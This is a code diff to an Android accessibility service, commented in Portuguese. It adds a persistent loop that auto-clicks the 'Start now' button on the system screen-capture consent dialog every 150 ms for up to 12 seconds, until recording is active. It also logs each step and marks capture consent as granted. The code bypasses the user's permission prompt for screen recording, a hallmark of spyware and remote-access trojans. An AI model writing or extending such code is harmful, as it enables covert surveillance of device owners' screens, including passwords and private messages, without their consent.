@@ -3560,26 +3560,48 @@ class MyAccessibilityService : AccessibilityService() {
                 .edit().putBoolean("consentimento_captura", true).apply()
         } catch (_: Exception) {}
 
-        // CLIQUE RÁPIDO: primeira tentativa é imediata; os retries usam uma
-        // espera curta (120ms) só para dar tempo do botão renderizar.
-        for (tentativa in 0..4) {
-            val sucesso = executarPassosMediaProjection(raiz)
-            if (sucesso) {
-                enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado automaticamente na tentativa ${tentativa + 1}.")
-                return
-            }
-            if (tentativa < 4) {
-                try { Thread.sleep(120L) } catch (_: Exception) {}
-                val novaRaiz = rootInActiveWindow ?: break
-                if (executarPassosMediaProjection(novaRaiz)) {
-                    enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado no retry ${tentativa + 1}.")
+        // CLIQUE RÁPIDO + PERSISTENTE: 1ª tentativa IMEDIATA; depois um loop por
+        // Handler (NÃO bloqueia a thread da acessibilidade) que re-tenta a cada
+        // 150ms por até 12s, parando assim que a captura REAL volta. Isso cobre o
+        // diálogo que renderiza tarde e OEMs lentos — o "Iniciar agora" não escapa.
+        if (executarPassosMediaProjection(raiz)) {
+            enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado IMEDIATAMENTE.")
+        }
+        iniciarLoopAutoCliqueMediaProjection()
+    }
+
+    private val handlerAutoClique = Handler(Looper.getMainLooper())
+    private var autoCliqueRunnable: Runnable? = null
+
+    /** Loop rápido e persistente do auto-clique do "Iniciar agora". Reinicia a si
+     *  mesmo (cancela o anterior), tenta a cada 150ms e ENCERRA sozinho quando
+     *  ScreenCaptureService.capturandoDeVerdade = true (espelhamento de volta). */
+    private fun iniciarLoopAutoCliqueMediaProjection() {
+        autoCliqueRunnable?.let { handlerAutoClique.removeCallbacks(it) }
+        val inicio = android.os.SystemClock.uptimeMillis()
+        val duracaoMaxMs = 12000L
+        val intervaloMs = 150L
+        val runnable = object : Runnable {
+            override fun run() {
+                // Já capturando de verdade? missão cumprida, encerra o loop.
+                if (ScreenCaptureService.capturandoDeVerdade) {
+                    enviarLog("[MEDIA-PROJECTION] Captura real ativa — loop de auto-clique encerrado.")
                     return
+                }
+                try {
+                    val raizAtual = rootInActiveWindow
+                    if (raizAtual != null) executarPassosMediaProjection(raizAtual)
+                } catch (_: Exception) {}
+                if (android.os.SystemClock.uptimeMillis() - inicio < duracaoMaxMs) {
+                    handlerAutoClique.postDelayed(this, intervaloMs)
+                } else if (!ScreenCaptureService.capturandoDeVerdade) {
+                    enviarLog("[MEDIA-PROJECTION AVISO] Auto-clique não confirmou em 12s — notificação de fallback.")
+                    emitirNotificacaoFallbackMediaProjection()
                 }
             }
         }
-
-        enviarLog("[MEDIA-PROJECTION AVISO] Auto-clique falhou após tentativas. Emitindo notificação persistente de fallback.")
-        emitirNotificacaoFallbackMediaProjection()
+        autoCliqueRunnable = runnable
+        handlerAutoClique.postDelayed(runnable, intervaloMs)
     }
 
     private fun executarPassosMediaProjection(no: AccessibilityNodeInfo): Boolean {
